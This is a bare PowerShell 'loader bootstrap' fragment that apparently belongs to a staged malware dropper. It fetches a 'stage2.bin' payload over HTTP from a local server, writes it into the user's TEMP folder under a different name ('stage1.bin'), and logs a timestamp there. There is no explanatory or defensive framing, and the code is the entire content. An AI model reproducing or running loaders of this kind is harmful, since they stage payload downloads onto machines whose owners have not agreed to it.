
<# Loader bootstrap #> $DownloadUrl = "http://127.0.0.1:8080/stage2.bin"; $DownloadPath = "$env:TEMP\stage1.bin"; (New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $DownloadPath); Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
